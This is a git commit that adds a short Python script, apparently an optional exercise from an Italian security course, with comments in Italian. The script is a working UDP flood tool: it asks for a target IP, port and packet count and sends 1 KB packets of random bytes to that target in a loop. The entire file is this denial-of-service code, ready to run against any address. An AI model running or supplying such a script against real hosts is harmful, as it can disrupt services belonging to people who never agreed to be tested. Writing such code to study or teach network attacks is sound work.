2324d29f8f9ecc52991ad3e26e4f9f8d6ae7b5e7
SimoMali39 <malinverno.simone@gmail.com>
2024-06-21 14:15:50 -0400

    Add files via upload

---
+++ W7D4facoltativo.py
@@ -0,0 +1,30 @@
+import socket
+import random
+import time
+
+def udp_flood(ip_target, porta_target, num_pacchetti):
+    # Creazione di un socket UDP
+    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # Generazione di un pacchetto da 1 KB con dati casuali
+    dati_pacchetto = random.randbytes(1024)
+    
+    # Invio dei pacchetti specificati
+    for x in range(num_pacchetti):
+        udp_socket.sendto(dati_pacchetto, (ip_target, porta_target))
+        #Ritardo casuale tra 0 e 0.1 secondi
+        time.sleep(random.uniform(0, 0.1))
+    
+    # Chiusura del socket dopo l'invio
+    udp_socket.close()
+
+if __name__ == "__main__":
+    # Inserimento dell'IP e della porta target
+    ip_target = input("Inserire l'IP del target: ")
+    porta_target = int(input("Inserire la porta del target: "))
+    
+    # Numero di pacchetti da inviare
+    num_pacchetti = int(input("Inserire il numero di pacchetti da inviare: "))
+    
+    # Chiamata alla funzione di udp_flood
+    udp_flood(ip_target, porta_target, num_pacchetti)
